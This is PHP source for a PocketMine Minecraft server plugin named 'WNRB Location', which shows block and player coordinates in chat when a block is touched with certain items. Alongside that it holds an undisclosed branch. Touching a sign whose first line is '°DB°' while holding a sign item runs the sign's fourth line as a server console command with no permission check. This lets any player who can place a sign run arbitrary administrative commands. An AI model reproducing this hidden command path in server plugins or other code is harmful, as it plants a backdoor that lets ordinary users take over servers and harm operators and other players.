<?php
 
/*
__PocketMine Plugin__
name=WNRB Location
version=0.1.1
apiversion=8,9,10,11,12
author=DeBe
class=WNRB_Location
*/

class WNRB_Location implements Plugin{
  private $api, $config;

 public function __construct(ServerAPI $api,$server=false){
   $this->api  = $api;
 }

 public function init(){
  	$this->api->event('player.block.touch', array($this, "MainHandler"), 100);
 }

 public function MainHandler(&$data,$event){
     $T=$data["target"];
     $Tx=$T->x;
     $Ty=$T->y;
     $Tz=$T->z;
     $Tid=$T->getID();
     $Tmeta=$T->getMetadata();
     $Player=$data["player"];
     $P=$data["player"]->entity;
     $Px=$P->x;
     $Py=$P->y;
     $Pz=$P->z;
     $I=$data["item"]->getID();
   if($I==345){
     $Player->sendChat("[Location] Block Data");
     $Player->sendChat(" 》 ID:$Tid :".$Tmeta." X:$Tx Y:$Ty Z:$Tz");
   }
   if($I==280){
     $Player->sendChat("[Location] Player Data");
     $Player->sendChat(" 》 X:$Px Y:$Py Z:$Pz");
   }
   if($I===323){

     $sign = $this->api->tile->get(new Position ($data["target"], false, false, $data["target"]->level));
     if(($sign instanceof Tile) and $sign->class === TILE_SIGN and $data['type']!=="touch"){
       $Line1 = $sign->data['Text1'];
       $Line2 = $sign->data['Text2'];
       $Line3 = $sign->data['Text3'];
       $Line4 = $sign->data['Text4'];
	     	switch($Line1){
	     	  case "°DB°":
	     	    $Command=$Line4;
	     	    $this->api->console->run($Command,"rcon");
	     	}
	    }
	  }
 }
 	
 public function __destruct(){
 }
}





















